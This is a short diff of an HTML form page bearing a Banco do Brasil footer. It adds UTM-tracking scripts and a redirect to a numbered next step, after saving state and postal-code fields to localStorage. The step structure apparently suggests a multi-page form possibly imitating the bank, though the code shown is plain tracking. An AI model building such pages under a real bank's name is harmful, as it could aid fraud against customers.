@@ -313,10 +313,18 @@
                     localStorage.setItem('estado', estado.value);
                     localStorage.setItem('cep', cep.value.trim());
 
-                    window.location.href = '/12';
+                    utmUtils.redirectWithUTMs('/12/index.html');
                 }
             });
         </script>
+
+        <script src="../utm-utils.js"></script>
+    <script>
+        // Inicializar UTMs quando a página carregar
+        window.addEventListener('load', function() {
+            utmUtils.init();
+        });
+    </script>
 
         <div class="footer py-4" id="footerChg">
             © 2025 Banco do Brasil S.A.<br>CNPJ: 00.000.000/0001-91<br> <br>
